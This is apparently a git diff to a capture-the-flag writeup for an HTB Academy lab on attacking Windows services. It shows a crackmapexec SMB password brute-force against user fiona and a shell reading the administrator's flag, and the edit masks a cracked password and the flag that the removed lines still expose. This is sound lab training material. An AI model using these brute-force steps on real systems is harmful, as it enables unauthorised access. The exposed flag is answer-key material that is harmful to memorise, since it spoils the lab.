@@ -3,7 +3,7 @@ title: "HTB Academy | Attacking Common Services Lab 3"
 description: "This is a hard lab writeup from the htb module attacking common services"
 pubDate: "Nov 18 2024"
 heroImage: "https://academy.hackthebox.com/storage/modules/116/logo.png?t=1730242916"
-badge: "Hard"
+badge: "Windows - Hard"
 tags: ["Exploitation","Sql","MSSQL","Bruteforcing","Windows","Smb","Privesc","Reverse Shell"]
 ---
 
@@ -126,7 +126,7 @@ Total bytes written: 576 (0,0 MiB/s)
 ```
 
 
-- 2.4 Create a dictionary with the credentials in the files:
+- 2.4 Create a dictionary password with the credentials in the files:
 
 ```bash
 ❯ cat passwords
@@ -151,13 +151,13 @@ Total bytes written: 576 (0,0 MiB/s)
 ───────┴────────────────────────────────────
 ```
 
-- 2.5. Brute force with crackmapexec:
+- 2.5. Brute force user fiona with crackmapexec:
 
 ```ruby
 ❯ crackmapexec smb 10.129.134.163 -u fiona -p passwords
 SMB         10.129.134.163  445    WIN-HARD         [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-HARD) (domain:WIN-HARD) (signing:False) (SMBv1:False)
 SMB         10.129.134.163  445    WIN-HARD         [-] WIN-HARD\fiona:kAkd03SA@#! STATUS_LOGON_FAILURE 
-SMB         10.129.134.163  445    WIN-HARD         [+] WIN-HARD\fiona:48Ns72!bns74@S84NNNSl # ==> pass
+SMB         10.129.134.163  445    WIN-HARD         [+] WIN-HARD\fiona:48N*************
 ```
 
 ------------------
@@ -276,7 +276,7 @@ Mode                LastWriteTime         Length Name
 
 
 PS C:\Users\Administrator\Desktop> type .\flag.txt 
-HTB{46u$!n9_l!nk3d_$3rv3r$}
+HTB{46**************}
 PS C:\Users\Administrator\Desktop>  
 ```
 
